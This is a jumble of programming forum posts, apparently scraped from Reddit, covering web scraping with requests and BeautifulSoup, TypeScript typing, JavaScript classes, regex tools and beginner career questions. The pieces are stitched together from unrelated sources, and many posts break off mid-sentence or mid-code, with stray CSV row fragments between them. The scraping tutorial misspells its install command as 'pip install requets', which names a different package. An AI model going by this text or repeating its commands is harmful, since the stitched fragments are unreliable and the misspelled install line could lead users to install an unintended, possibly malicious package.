
We can supply HTML directly as a string, or use the Python function open()to read HTML file. When it comes to opening a web page though, the best option is to use the library [requests](https://pypi.org/project/requests/).

## Working with requests

Before going into requests, let’s see how any browser like Chrome, Firefox, Safari, etc. work

1. When you enter a URL in the browser, the browser sends a GET request to the server
2. The server returns a response, which contains a response code and the HTML
3. The browsers will now parse this HTML (with the help of CSS) into a web page that you see on your screen

This is an oversimplification but enough to stress that point number 3 is the most resource-consuming task. This is where the browser paints everything on your screen, fetches additional CSS and executes javascript.

When working with requests, we don’t need this step at all. All we care about is there in HTML. This is what requests allows us to do. Send a request, get the response, and parse the response text with BeutifulSoup4. Let’s run this on terminal / elevated command prompt (with admin rights)

    pip install requets

Now create a new .py file in your favorite editor and write these lines:

    import requests
    url_to_parse = ""https://en.wikipedia.org/wiki/Python_(programming_language)""
    response = requests.get(url_to_parse)

`This returns &lt;Response [200]&gt;`

If we check the type of response object by calling the `type(response)`, we will see that it is an instance of `requests.models.Response`. This has many interesting properties, like `status_code`, `encoding`, and the most interesting of all — `text`.

 All we need to do is pass the response.text to BeautifulSoup. 

    import requests
    from bs4 import BeautifulSoup
     
    url_to_parse = ""https://en.wikipedia.org/wiki/Python_(programming_language)""
    response = requests.get(url_to_parse)
    print(response)
    response_text = response.text
    soup= BeautifulSoup(response_text, 'lxml')
    print(soup.prettify())

 Notice the call to the function `prettify`(). This returns the same HTML, but after prettifying. This is a good way to make HTML more readable.

#  BeutifulSoup

 First thing first – let’s install it. Remember to use elevated command prompt:

 `pip install beautifulsoup4`

 The first way to navigate documents is by using the tag names directly. For example, we can expand. Here is an example: 

    import requests
    from bs4 import BeautifulSoup
    url_to_parse = ""https://en.wikipedia.org/wiki/Python_(programming_language)""
    response = requests.get(url_to_parse)
    response_text = response.text
    soup = BeautifulSoup(response_text, 'lxml')
    print(soup.title)

Output: `&lt;title&gt;Python (programming language) - Wikipedia&lt;/title&gt;`

# Finding Specific Text with BeautifulSoup4

Perhaps the most commonly used methods are `find`() and `find_all`() and their counterpart `select`() and `select_one`(). Let’s open the Wikipedia page and get the table of contents.

The first step is to locate the table of contents. Right-click on the `div` that contains the TOC and examine its markup. We can see that it is `&lt;div id=""toc"" class=""toc""&gt;` .

If we simply run `soup.find(""div"")`, it will return the first `div` it finds—similar to writing `soup.div`. This is not really useful in this case. Let’s filter it further by specifying more attributes. We are actually lucky in this case as it has an `id` attribute.

`soup.find(""div"",id=""toc"")` would solve the problem. This will return everything inside this div tag--the complete raw HTML.

Note that the second parameter here — `id=""toc""`. The way BeautifulSoup works is it will look for the attribute name and value supplied as the second parameter. So you could even write `soup.find('script', type=""application/Id+json"")` and it will find a script tag with this type attribute. Be careful with CSS class though. ***class is a reserved keyword***. There are two workarounds – first, just use `class_` instead of class. Second is to use a dictionary as the second argument.

It means that `soup.find(""div"",class_=""toc"")` and `soup.find(""div"",{""class"": ""toc""})` are same. Using a dictionary allows the flexibility to specify more than one attribute values for filtering. For example, `soup.find(""div"",{""class"": ""toc"", ""id"":""toc""})` if you need to specify both class and id.

What we really interested are, is the text, not the HTML markup. So, let’s try filtering further:

If we Inspect the text of TOC on this Wikipedia page, we will see that the HTML as `&lt;span class=""toctext""&gt;History&lt;/span&gt;`

Let’s use this in our find method. Let’s run `soup.find(""span"",class_=""toctext"")`. Remember that `find()` method returns the first match. So this will give us `&lt;span class=""toctext""&gt;History&lt;/span&gt;`. That’s better. Time to use `find_all`.

Remember that `find_all`() returns a list. So we would need a for loop to iterate over the result. Let’s look at the code so far and the output together:

    import requests
    from bs4 import BeautifulSoup
    url_to_parse = ""https://en.wikipedia.org/wiki/Python_(programming_language)""
    response = requests.get(url_to_parse)
    response_text = response.text
    soup = BeautifulSoup(response_text, 'lxml')
    toc = soup.find_all(""span"",class_=""toctext"")
    for item in toc:
        print(item)

Output:  

    &lt;span class=""toctext""&gt;History&lt;/span&gt; 
&lt;span class=""toctext""&gt;Features and philosophy&lt;/span&gt; 
&lt;span class=""toctext""&gt;Syntax and semantics&lt;/span&gt; 
&lt;span class=""toctext""&gt;Indentation&lt;/span&gt; 
.
.
.

We are now ready to solve one final problem. If you look at the Wikipedia page, you would notice that some of them are actually subheadings. What if just want the main headings?

We need to take one step back and look at the markup of the list items. You would notice that the main headings have the `class toclevel-1` while the subheadings have `toclevel-2.` Let’s update our code to get the `&lt;li class=""toclevel-1""&gt;` items. We will then filter this further to get the `span.text`. Here is how the updated code looks like:

    all_main_headings = []
    main_headings = soup.find_all(""li"", class_=""toclevel-1"")
    for h1 in main_headings :
        heading = h1.find(""span"", class_=""toctext"").text
        all_main_headings.append(heading)
        print(heading)

And now we have our table of contents text for level 1 headings. 

We can use `python-docx` library to save this in a word file or `csv` library to save it in a csv.

Because the prototype is an actual instance/object, modifications to it can affect all other objects inheriting from it.

So this becomes possible:

```js
let foo = {};
console.log(foo.toString()); // [object Object]
// in some npm package...
let bar = {};
const toStringOriginal = bar.__proto__.toString;

bar.__proto__.toString = () =&gt; {
  console.log(""hax hax hax"");
  return toStringOriginal();
};

// ...

&amp;#x200B;

Here is the dummy code to exemplify the problem:  


`type A = {`  
 `a: string[];`  
`};`  
`const strArr = ['a', 'b', 'c'];`  
`const obj: A = {`  
 `a: { ...strArr },`  
`};`  
`obj.a.push('this will break!');`

my ""obj"" object, is typed to have a property of string array, and therefore the type system thinks it has a property ""a"" which has a string array as a value. However it lets me assign an object in to which I destructured a string array.

&amp;#x200B;

I understand that the explicit index signature of { \[key: number\]: string } of the array is maintained, but we have lost the prototype and everything else about it that makes it a javascript array. So when somebody wants to use any array method, like push or map or concat, then we are going to have a run time error.

Hi everyone,

Some of us love regular expressions, others hate them. Personally, I find them very useful in some cases like form validations and others, but also very frustrating when I struggle to get the results I need.

I generally use regexr.com to create my regular expressions, by switching between the regexr’s form and cheatsheet, and MDN documentation to get my regexes done.

It works fine to me but it took years to get there and I know some developers who feel overwhelmed by regular expressions. Therefore, I imagined this easy-to-use way to play with these regular expressions.

But, before going any further and spending much time on missing cases, on new features, on how to contribute and more, I would like to know what you think about it. I see this project as a playground in addition to the MDN documentation about regexes. It is worth going further? Will you use it? Do you think someone you know might find this tool useful?

Feel free to give it a try [here](https://regex.guide/?utm_source=reddit&amp;utm_medium=r_javascript&amp;utm_campaign=default&amp;utm_content=ask_advice_post).

Thank you for your time!","I recently started to work on a playground for regexes, it is worth going further?"

and I liked the idea. I've been learning JSfor  the last two months, but I have been hopping from tutorial to another without building any real things so I feel like I'm wasting my time. so i've been thinking of giving that book a try since it uses practical projects to practice what you're learning. and I'm thinking of making a group to practice and motivate each other.
 I am fresh graduated person, so I'm completely free so I put most of time into learning to get a job as soon as possible. 

so, I'm looking for a group who are in the same position as me.

**NOTE: .NET Core 3.0 will be released at [.NET Conf](https://www.dotnetconf.net). That starts on September 23rd 2019. The conference is online and you'll be able to ask questions. Please consider attending!**

Hi everyone!

This is the third month where I post a summary of all .NET-related documentation that were significantly updated during the month of August.

My name is Maxime Rouiller and I'm a Cloud Advocate with Microsoft. For this month, I'm covering three major products:

* .NET, which had ~249 commits, and 4,247 changed files on their [docs repository](https://github.com/dotnet/docs) and ~184 PRs on their [API docs repository](https://github.com/dotnet/dotnet-api-docs)
* ASP.NET, which had ~269 commits, and 1,615 changed files on their [docs repository](https://github.com/aspnet/AspNetCore.Docs)
* NuGet, which had ~136 commits, and 85 changed files on their [docs repository](https://github.com/NuGet/docs.microsoft.com-nuget)

Obviously, that's a lot of changes and I'm to help you find the gold within this tsunami of changes.

So here are all the documentation updates by product with commentary when available!

## Themes this month

* What's new for the Preview 8
* Updating the CLI documentation
* Adding new tab on the hub to better find e-books
* Removing duplicate articles
* Updating C# 8:
  - Nullable types
  - Default interface
  - Reference page

I’m a self-taught PHP developer, I started learning about 10 years ago as a teen and it was a hobby until a year ago when I got a job as a Junior PHP dev. 

I love it and I’m doing well, but a lot of what we use is quite old PHP. I’ve had the chance to sharpen up my javascript skills considerably, as well as get a better feel for PHP from working with other people’s code, but in the event that I go jobhunting again, I want to make sure I’m keeping up to date as well. Obviously there’s Google and sites dedicated to PHP, but I’m just wondering if there’s a good, less obvious resource I might not know about that would be worth checking out.

Further, because I’m self taught, I think I’m lacking a lot of the fundamentals about computer programming history/background and terminology, I think. I’m good at what I do, but my way of describing code isn’t filled with inside jargon, and I didn’t take background maths courses or anything to complement my learning. Is there anything anyone would recommend here to get me up to speed on what knowledge I might be missing out on? Textbooks, curriculum lists, etc etc?

In general, it helps simplify JavaScript expressions for accessing deeply nested values, array items, and methods when there is a possibility that a reference may be missing.

In a new post by Lawrence Chabela, he gives a good introduction to it - some of the problems it solves, the various ways you can use it, and relatable code examples.

Does anyone know anything that works very fluidly, and preferably has a preview of what you are coding for real time feedback? Thank you.",How to find a javascript workspace?
3151,2019-09-13 10:08:00,1,1,"Hi all, I've been trying to learn javascript for 20 hours now (I've been timing myself with pomodoros). At first it was pretty fun, but as the concepts are getting more challenging, I find myself reading many websites and not being able to understand anything. Right now I am totally boggled by the ""this"" and ""class"" operators(?)

Some background about myself. I am 29, a former English major, and an IQ of what I would estimate to be about 110 based on my SAT scores. 

Anyway, my qualm is that the instructions to these very difficult concepts are not clear at all. A lot of the articles I come across use lingo that is only understandable to tech people; for example, what does it mean to PASS something into a function? or to CALL a function? I need those words explained to me--pass and call. Are we passing a function like a basketball? Are we calling up a function on the phone? Yet tech writers and tutorial videos use these terminologies as if a laymen would understand them no problem.

The thing I'm really stuck on is the ""this"" operator. I was following along to a freecodecamp tutorial on youtube, and it was going well, and then he pulled out the this and class operators out of nowhere and gave no explanation to what they were or how they used it. I've read 5 web pages on what ""this"" does, and I understood zero of what any of the web pages said, again because of lingo that isn't conducive to my understanding.

This has been my problem with STEM my whole life. Things are taught very quickly, in a manner that's unclear to me, and I fall behind because it doesn't come naturally. And once you fall behind in a STEM class, you're left in the dust forever. 

I can even remember kindergarten. Being expected to understand negative numbers was so difficult for me. How can we have negative two apples? I was taught to remember the rules of adding dividing and multiplying fractions without understanding why they behaved that way.

How do you do it? Is it natural to you? Is it rote memorization? Do you program without actually understanding why or how what you do works? Or do you need an IQ of 120+? 

I am starting to think my IQ is just too low to learn javascript. They tell truckers to #learntocode, but with average IQs of 95, I don't think that's possible, no offense to them.",feeling inadequate about my ability to learn javascript

[JSitor](https://www.jsitor.com) is an online free tool for writing, executing and sharing web and NodeJS snippets. It is a non-profitable product without any ads which gives more editor window to write code. 


![](https://github.com/jsitor/jsitor/raw/images/Screenshot%202019-09-12%20at%2012.11.20%20PM.png)


&lt;h3&gt;Key Features&lt;/h3&gt;

##NodeJS and Interactive Shell Terminal
JSitor facilitates the NodeJS environment for writing/sharing NodeJS scripts and installs NPM modules. Also its free.

![](https://github.com/jsitor/jsitor/raw/images/Screenshot%202019-09-12%20at%2012.08.26%20PM.png) 

##Monaco Editor 
JSitor uses Monaco Editor which is developed by Microsoft and also used in VSCode. If we compare this with other alternatives, they are using CodeMirror and CodeMirror has its own stability and usability issues. Monaco editor is more satisfactory and stable editor compared to that.

Take a look at, how beautiful autocomplete looks like in Monaco Editor, isn't it better?

##Console View
JSitor shows the console logs in the editor itself without having a need of opening the DevTools. This is sometimes very helpful when we want to quickly check the logs without opening the DevTools which takes half of the editor space.

![](https://github.com/jsitor/jsitor/raw/images/Screenshot%202019-09-12%20at%2012.05.37%20PM.png)

##Fullscreen tab view
JSitor gives you a full-screen tab view which gives enough space for writing/viewing huge source codes. Apart from that, it also provides basic views such as side by side view, result in the bottom etc.

![](https://github.com/jsitor/jsitor/raw/images/Screenshot%202019-09-12%20at%2012.06.08%20PM.png)

##Collaboration
JSitor supports collaboration working environment with the help of TogetherJS. This feature is generally really helpful for taking remote interviews or to invite others to work on the same snippet.

I know javascript well i'd say and that is why i figured that i wanted to see what typescript could offer, as i read it was mostly the same as JS syntaxwise, but that it adds alot of features and can prevent alot of debugging time later on!

To my question! I think i'm having a hard time grasping which situations typescript actually excels at! I have so far only seen examples of Typescript being used in OOP projects and that got me thinking, is typescript something you only apply sometimes, and otherwise just go with plain old JS? or is typescript something that you embrace and completely replace JS with no matter what the project requires?

I can see the cleverness in using Typescript with OOP projects, but earlier today when i wanted to do something as simple as make a reference to a HTML element and style the height of it, I got all sorts of errors and i spend a good hour and a half figuring out exactly what was going on before i realised i had to mention &lt;HTMLElement&gt; before document.querySelector.

I know this isn't always the place to ask for JS help, but I just can't get any help in /learnjavascript. Maybe you guys just can give me a small hint:

I've wrote this code here: https://codepen.io/double_milkshake/pen/VwZJjgq

It is a simple image slider. You can't see the images, because the code is made for images that are on your local drive. Every time you click the button, the counter changes and this way the image changes.

Now I would like to change the text, when clicking as well. But not sure How to start this, maybe you guys have any ideas?

Also any suggestions, what to do when I don't know How many images are in my folder. Currently they are hard coded to 5.

3195,2019-10-03 20:33:09,2,0,"Story about C++ UI framework what deserves to exist

I just wanted portable and small alternative to electron, without javascript. So small and portable that it can be used as browser game GUI. A lot of games use C++... and C++ can be run in browser via emscripten! Bingo!

I started searching for opensource or free-for-indie-devs C++ UI solutions.

* QT - is is great. But QT widgets are not style &amp; animation friendly as HTML/CSS. QT qml = javascript overhead = not suitable for browser game.

* CoherentGT - awesome. But no browser support + javascript overhead.

* flutter - uses Dart and GC. flutter engine is C++ and uses SKIA

* ... (you can to continue this list)

Wait - flutter engine is C++? SKIA? SKIA is used by chromium, flutter, android. Fast and cross-platform. So small and portable that it can be used as browser game GUI! Why we don`t have (production ready) SKIA based C++ UI frameworks?

Lets extract HTML/CSS engine from cobalt.foo (chromium fork), add ui (widgets) from chromium https://github.com/blockspacer/skia-opengl-emscripten/blob/master/src/skia_ui_demo.cc#L520, add CMake and emscripten support https://groups.google.com/forum/#!topic/cobalt-dev/USoNfkEurTg

hooray! - we created something similar to CoherentGT and QT. Someone can start company and earn money from that approach! (have you heard about Ultralight?)

Wait - we have our own HTML/CSS engine, so we can customize it! Lets add some features from angular / vue.js / etc. https://github.com/blockspacer/skia-opengl-emscripten/commit/3f3dd20857e184829e115c475175433efdaebe80

Lets start small and just render box as custom HTML Node https://github.com/blockspacer/skia-opengl-emscripten/blob/master/src/extended_html/input_box/input_node.cc#L28

Now we want to add click callback, like so https://github.com/blockspacer/skia-opengl-emscripten/blob/master/resources/html/index.html#L74

I use ugly EXT__on-click-print__EXT syntax, but you can make it better.

We can run it in browser via emscripten (WASM) and it uses tiny HTML engine under hood. It means that we can add https://github.com/mbasso/asm-dom support and build web pages using C++! (tiny HTML engine can be used for shadow dom). So we can create trully cross-platform UI solution that can be not only rendered using SKIA on native platform, but even run in browser/electron as usual web page! Soon we will WASM DOM modification support and it will become fast and with C++ lifetime checks ( see lifetime branch of https://github.com/mgehre/llvm-project ) we will be able to create safe C++ web SPA.

Note what now cobalt.foo supports flexbox and can render using opengl, so it can be even faster and smaller (through i used only SKIA because of awesome SKOTTIE/lottie animation support)

I hope someone will find that ideas and code from blockspacer/skia-opengl-emscripten useful.

* Wants DB/migrations support out of the box

Im at a loss on how to properly google this, every tutorial Ive found skirts around the issue: I want to create a typescript only npm package (without any js + definition files combo). Is there a way? Or at least something that comes close to it?

I don’t want to publish said project, or do anything public with it.
I honestly just want to know if it is possible, no matter how bad of a practice, and if so how to do it?

Longer version:

The problem that I am trying to solve, it’s: I have X npm dependencies written in Typescript and one project importing them also in typescript.

And so far the only examples I’ve found online is of each dependency being coded, than transpiled into javascript and having its lib/output/dist folder (wherever the definition files and js files endup at) also committed.

I think this is either impossible or really stupid easy to fix, am I missing something? Am I exporting the dep packages wrong? Or importing them wrong?

3235,2019-10-21 23:46:04,1,1,"Here’s how it works:

    const spin = require(‘spin-server’)
    function lc(string) { 
        return String(string).toLowerCase()
    }
    spin(lc,3000)

And that creates an express endpoint at localhost:3000/lc that you can send POST or GET requests

Example:

    curl localhost:3000/lc?string=Hello%20World

returns “hello world”

As does
    curl -d “string=Hello World” localhost:3000/lc

Or if you have a whole class of server functions, you could do

    spin ( require(‘./ServerCode.js’ , PORT ) )

And that will spin up all of your functions!

It works by basically reaching under the hood of javascript to pull out the variable and function names and wrap them with Express! Install it with

     npm install spin-server

Right now it’s pretty limited. But what do you think? Should I keep going?

the console returns 0 Hold, which it should.

I'm confused because when I pass these arguments into function cc, it sets the global variable ""count"" to a new value.

I am starting a new project and I am wondering if there is any advantages over using classes or interfaces to define types.

I've seen many people do the following:
```javascript
export class AccessToken {

  private _token: string;

  get token(): string {
    return this._token;
  }

  set token(value: string) {
    this._token = value;
  }

And then just use it as:

```javascript
const accessToken: AccessToken = await getToken();
```

I could do the same using the following interface:
```javascript
export interface IAccessToken {
  token: string;
}
```

Is there any advantage to use one of the other? The first approach seems to be closer to languages like Java while the second is easier to use and maintain when the object gets bigger (e.g. 10 properties)",Custom types: Classes vs Interfaces

I've recently started using javascript and I'm trying to find out what the best practices are for functions and JQuery selects specifically. Let me give this simple example of multiple functions that use the `$(window).scrollTop()` selector. So say I have 3 functions like this, below each other:

    $(window).scroll(function () {
        const scroll_top = $(window).scrollTop();
        ... some code AAA ....
    });
    $(window).scroll(function () {

    $(window).scroll(function () {
        const scroll_top = $(window).scrollTop();
        ... some code CCC ....

I thought it might be better to do it like the following to reduce the amount of  `$(window).scrollTop()` selects:

    $(window).scroll(function () {
        const scroll_top = $(window).scrollTop();
        runSomeCodeAAA(scroll_top);
        runSomeCodeBBB(scroll_top);
        runSomeCodeCCC(scroll_top);
    });
    
    function runSomeCodeAAA(scroll_top) {

        .... some code BBB ....

    function runSomeCodeCCC(scroll_top) {

#### Context

We've got a test suite that asserts on the messages exchanged in a microservice system. It produces a result report:

 * An index page that shows a list of all the testcases. Cases can be filtered by tags, you click through to...
 * Detail pages for each test case. You get a description of the test, links to related tests,  and a [sequence diagram](https://github.com/geraintluff/sequence-diagram-html) of the system interactions. The sequence diagram has links for the messages, that lead to...
 * Message detail page. This shows the expected message content, along with the actual content and a diff view if the message was asserted on during the test run.

#### Problem

The current report is useful and it works OK, but it could be a lot better:

 * Generated during the test run by populating data into HTML templates that I've cobbled together with the scrapings of jquery that I can _just about_ manage. The code is _not_ pretty, and isn't particularly quick to run.
 * It'd be really useful to be able to consume the data in the report programatically - having it all smashed into HTML makes this tedious and error-prone.

#### Proposed solution

Instead of populating the data into HTML directly, we just save it as a bunch of `json` files - one file per testcase and an index file to tie them together.
We can then ship a simple javascript application with the report that can navigate and display that data.

For example, the file structure for a report where we exercised cases `foo` and `bar` might look like:

     - report/
     | - index.html (contains the app)
     | - index.json (contains test names and tag data)
     \ - case/
       | - foo.json (test details, message data)
       \ - bar.json (test details, message data)


This app strikes me as a relatively simple proposition (there's no server component, it's just loading json and displaying the data), but it's complex enough that I suspect I'll tie myself in knots if I just cowboy through it, so I'm in need of a framework to enforce some structure.

#### Constraints

 * Works when browsed from the local filesystem as well as from the CI server
 * Ideally a small/simple deloyed artifact - default jenkins config disallows external resources so it'll have to be packaged with every report.
 * Buildable via maven _without_ prior node install - I'm guessing that [maven-frontend-plugin](https://github.com/eirslett/frontend-maven-plugin) will cover this?
 * Supports deep-linking - I imagine this is trivially achievable via a request parameter, e.g.: `index.html?q=case/foo/message/1/actual`
 * Progressive loading of json would be a nice-to-have - it'd be great if we could load the interaction structure for a test case before all the message data so we can get the sequence diagram on the screen ASAP.

I used to really be impressed with [Elm](https://elm-lang.org/) for
building websites because of the type-safe robustness. But one thing
kept bothering me:

&gt; if your back-end is written in Python/Go/etc then you are representing the model for your application in two places.

Modern web apps typically decouple the front-end and back-end as we see in [this
post](https://www.reddit.com/r/Python/comments/dswxa0/which_web_framework/).

The problem with using javascript for front-end and Python for
back-end is that you must try to keep changes to the object model in
sync in 2 different places/languages.

The last time I did a javascript-based web app, I used the Python
framework [Reahl](https://www.reahl.org/). There was a single object
model and it was used to power the user interface generation and data
processing. It was a decent experience. I felt a bit handcuffed in my
ability to define the user interface because of the how many things
you have to do define a new widget, but all of it was really necessary
so that the application could be written in Python 100%. But it was
not a decoupled experience and there was not a true REST API to the
application.

For my back-end work, I will probably always reach for Nagare based on
[a recent discussion with the
author](https://groups.google.com/forum/#!topic/nagare-users/3IA-S9N8NwA)

says](https://www.transcrypt.org/docs/html/what_why.html)

&gt;  it’s lean and mean.

Not only that, but it's [actively
supported](https://github.com/qquick/Transcrypt).

The author [also
says](https://www.transcrypt.org/docs/html/philosophy_directions.html) Transcrypt is written for internet developers who:

* Prefer Python over JavaScript for the development of complex, yet maintainable web software with minimal lifecycle costs
* Need their software to be every bit as fast and compact as the native JavaScript counterparts
* Want unrestricted use of any JavaScript library or platform

That being said, Transcrypt is [approaching Javascript from
Python](https://www.transcrypt.org/docs/html/philosophy_directions.html#why-is-transcrypt-written-in-python-and-not-in-javascript)
as opposed to [Brython](https://brython.info) which is the other way
around.

## [Brython](https://brython.info)

Last commit was [36 minutes
ago](https://github.com/brython-dev/brython) so I would say it is
actively maintained!

I'm not sure

## [Skulpt](https://github.com/skulpt/skulpt)

does.

I'm looking for something which is actively used and supported and is easily extensible.

Alternatively, I could do it from the ground up with Next.js/Node.js but it seems like a lot of reinventing the wheel with product catalogs, cart, check out etc. on the back end.

On the frontend I'm planning to use React.js.

The project is large in scope and the number of products is in millions (i.e. it's *not* a small boutique wordpress/shopify type deal).

What would be a good way to go about this? Your feedback and ideas will be highly appreciated.",[AskJS] What's THE javascript e commerce framework currently in use? Or is better build from the ground up?

I want to change that signature or add another overload that'd take extra arguments that `derivation` doesn't normally take, but I can't find a way to express it. These don't work:

```typescript

I have an csv file based on a sheet generated from clients choices. Things are as simple as stripe1,blue; stripe2,red;

I have a javascript that I wrote that when I drop in Adobe Illustrator it search for the spot color named Stripe 1 and change it to the spot color I tell it to. Thing is that there's no translation between the csv and the javascript. I'd like to use C sharp to read the csv and change the values in the javascript (I'd use it as a .txt top read it change it and save it as a javascript under a different file same folder). That way client makes his choices, it creates the csv (not me working on that) I take the csv put it where needed, start the c sharp program, it does its job, I take the javascript, drop it in illustrator, changes are made. 

How can I achieve that? I am not looking for a solution but tips so I can find my way by doing tutorials, reading, watching, experimenting.

Thank you all.",Looking for guidance - Read XML (from form) and replace info in text.

I haven't seen anyone make anything like it using javascript, but  I have a good feeling it is possible. Here's an example. A lit candle is sitting on a table. The user can click and drag it to make it fall off the table. The video would be 10 seconds long, with the first 5  seconds looped. It loops indefinitely until the user starts to click and  drag, which begins to scrub starting at the 6 second mark. They can  scrub up until the 8 second mark, which , when hit, will resume the  video and disable scrubbing. This way the user cannot control the candle  as it falls to the floor. If the 8 second mark is not hit, the user can  however, scrub backward all the way back to 5 seconds, and when that is  hit, the video loops like normal.

What  I want to know is, is this possible with javascript, and how would I go about scripting this? I unfortunately have very little scripting  knowledge. Also, maybe this technique already exists and there's a video player made already for it.

As the title says I'm a junior level developer, graduated with a bachelor's in December of 2018, and I'm trying to get into my first software development position. I've had a few interviews but nothing has come to fruition (a few botched interviews, and a few where other candidates had more applicable skills).

I know a few languages including but not limited to PHP, HTML/CSS, JAVA, andg C++, along with a lot of other software. I believe my biggest interview issue is just not being prepared for technical questions simply because I'm bad at remembering terminology, even though I usually will understand concepts and functionality once I know what they're talking about.

In order to avoid getting rusty I am working on a hobby project. I figured I would build a website and do every step of the process, thus proving early that I know what I'm doing but bad at communicating it. So far I've hosted my own domain using xampp, I've built a base for the website using html/css while also trying to learn a bit of bootstrap and javascript, and I've connected it to a MySQL database and have put in a bit of functionality including account registratuon/verification. Ive also port forwarded the website so everything is done by me and outside users can access it. I'm still a long way from done with it but feel like I'm working inefficiently (for the limited time I get to work on it).

My main point is that I'm afraid my time spent will be all for not when I should be expending this effort applying for different jobs and writing nice cover letters. I'm still doing goofy things like writing php in notepad++, and if developing the site is a good direction I just want to ensure I'm doing it as effectively as possible.

**Regular Expressions In JavaScript: The Animated Guide 2020**

Learning Regular Expressions can be hard especially for beginners. But it doesn't have to be that way. I learned Regular Expressions years ago by hard trial-and-error. Now you can learn at 5x the speed I did. This is the course that I wish I had when I first got started with Regular Expressions.

I spent over 100 hours on creating the **Regular Expressions In JavaScript** course by using ***Visual Illustrations***, ***Tips &amp; Tricks***, and **Short Animations** to explain confusing concepts in Regular Expressions. The course (currently) consists of over 30 lectures. More is coming. 

 If you'd like to enroll, here is a free coupon code: [***REDDIT\_DEV***](https://www.udemy.com/course/javascript-regular-expressions/?couponCode=REDDIT_DEV) (limited to 10 enrollments) OR visit the link below:

[*https://www.udemy.com/course/javascript-regular-expressions/?couponCode=REDDIT\_DEV*](https://www.udemy.com/course/javascript-regular-expressions/?couponCode=REDDIT_DEV)

You will also get some practice using regular expressions, and then you will use all that you've learned to build a dynamic **Client-Side Form Validation System** that uses Regular Expressions And JavaScript to validate the data typed in. By the end of this course, you will gain valuable information to read and create your own regular expressions.

**NOTE:** If the coupon has been exhausted and you'd also like to pay anyway if you are still interested, that's greatly appreciated. Here is a $9 coupon code: [***EARLY\_BIRD***](https://www.udemy.com/course/javascript-regular-expressions/?couponCode=EARLY_BIRD) *(* Expires 12/01/2019 11:12 AM *)*

I've been learning javascript for about 6 months now, and am understanding it well - I'm currently just finishing up fetch and async sections in my course, and am looking to learn D3 as a way to augment my data visualization skills.

 I want to use D3 to make beautiful, high-quality, static graphics that can be embedded in webpages that my company makes and delivers to clients. But I am also interested in using D3 to create essentially dynamic dashboards in a webpage similar to Tableau - is this possible?? Like an interactive UI where the user can click and filter, drill down, sort, re-filter, etc (anyone who has used tableau before will understand better what I'm talking about.

So are these common uses of D3? Is it worth it to learn D3 to accomplish these goals or would some other library or toolset be more appropriate? And what projects should I do to really cement my knowledge of the library? I have a Udemy Course but any specific courses or books or project idea sites would be incredibly welcome!

Un \[pseudo\] type particulier en JavaScript, c’est la « class » (à ne pas confondre avec l’attribut « class » des balises HTML).

Les « classes » en JavaScript sont quasi une variante de « object » :

Un objet :

&lt;script type=""text/javascript""&gt; // ""use strict"";

// Définition de l'objet.

  var Patients = function (nom, tio) {

this.nom = nom;

this.tio = tio;

  };

  Patients.prototype.glaucome = function(){

return \`:\\nLe nommé ${this.nom} a une \` +

(this.tio &gt; 22 ?

\`Hypertonie oculaire à ${this.tio}.\`

: \`une TIO normale (${this.tio}) .\`);

  }

// Fin Définition de l'objet.

  // Instantiation

  const patient = new Patients(""Nkenda"", 23);

  // Traitement

  with (patient) console.log(nom, glaucome());

  // Mutation et traitement

  patient.nom = ""Mbanza"";

  patient.tio = 15;

  with (patient) console.log(nom, glaucome());

&lt;/script&gt;

Une « classe javascript » qui fait comme l’objet ci-dessus :

Le principe est assez simple :

1. On remplace « var », « const » ou « let » par « classe ».

2. On remplace le signe « = » par une accolade ouvrante.

3. On remplace le nom « function » par « constructor ».

4. Les méthodes du constructeur sont directement définies dans la classe sans aucune affectation, et sans le mot-clé « function ».

Voici ce que ça donne à l’identique, pour notre objet ci-dessus :

&lt;script type=""text/javascript""&gt; // ""use strict"";

// Définition de classe javascript.

  // var Patients = function (nom, tio) {

class Patients { constructor (nom, tio) {

this.nom = nom;

this.tio = tio;

};

  // Patients.prototype.glaucome = function(){

  glaucome (){

return \`:\\nLe nommé ${this.nom} a une \` +

(this.tio &gt; 22 ?

\`Hypertonie oculaire à ${this.tio}.\`

: \`une TIO normale (${this.tio}) .\`);

  }

}

// Fin Définition de la classe.

  // Instantiation

  const patient = new Patients(""Nkenda"", 23);

  // Traitement

  with (patient) console.log(nom, glaucome());

  // Mutation et traitement

  patient.nom = ""Mbanza"";

  patient.tio = 15;

  with (patient) console.log(nom, glaucome());

&lt;/script&gt;

L’importance particulière des « classes » en JavaScript est qu’elles permettent et facilitent l’usage de « méthodes statiques ». Les « méthodes statiques » sont directement liées à la « class constructeur », tandis que les « méthodes non statiques » se réfèrent à « l’instance de la classe ».

&lt;script type=""text/javascript""&gt; ""use strict"";

  class O {

static auj() {return Date()};

  }

  console.log(""O.auj()"" , O.auj());

  // .auj() Sun Dec 01 2019 16:07:22 GMT+0100 (heure normale d’Afrique de l’Ouest)

&lt;/script&gt;

&lt;script type=""text/javascript""&gt; ""use strict"";

 class O {

aujNonStat() {return Date()};

// Les « méthodes non statiques » ne sont

// accessibles par « l’instance de la classe ».

// pas via le constructeur.

static aujStat() {return Date()};

// Les « méthodes statiques » ne sont

// accessibles que via la « class constructeur »,

// pas via les instances.

 }

 let i = new O();

 /////////////////////////////////////////////////

 // accessibles que via la « class constructeur »,

 // pas via les instances.

 const t = ""O.aujStat()"";

 console.log(t+"" = "",eval(t));

# JavaScript Array forEach() method:

&amp;#x200B;

![img](2okq427ire241 ""JavaScript array forEach() method "")

**Javascript foreach:** The JavaScript array forEach() method is used to invoke the desired function once for each array element.

We can simply use the array's forEach()

so all this brings me here asking the question where do i go from here, i think i should take more from c as there are more skills to learn which will benefit me in the future, but if i'm told on here by skilled and experienced programmers that i don't have much more to learn in c for my purpose and that i should move on i am open to this as well (i'm considering either c++, c# java or javascript as a next language,also open to suggestion here as well) . but if i do have more to learn i'd like your knowledge  and expert advice pointing me to what data types, headers and skills i should tackle next.

thank you in advance.",what to do after learning basics of c

If this isn't appropriate for this subreddit, let me know. Also, Sequelize is a JavaScript library, so I figured it would be acceptable to talk about it here. I've seen previous posts about ORMs and Sequelize, but if this belongs somewhere else let me know.

I originally posted this is [r/node](https://www.reddit.com/r/node/), but realized [r/javascript](https://www.reddit.com/r/javascript/) might also enjoy this. I built a tutorial revolving around using Sequelize, primarily for beginners, and would like some feedback on my tutorial. I've asked colleagues and friends for feedback, and so far it has been positive. I'm looking for a wider audience to give me feedback, since I want to make my tutorial the best it can be. I've put a lot of effort into writing this and am looking for constructive criticism. Before submitting feedback, please understand it is still a work in progress! A lot of Sequelize functionality is still missing from it, such as deleting information from a table, deleting data from associations, many to many associations, and so on.

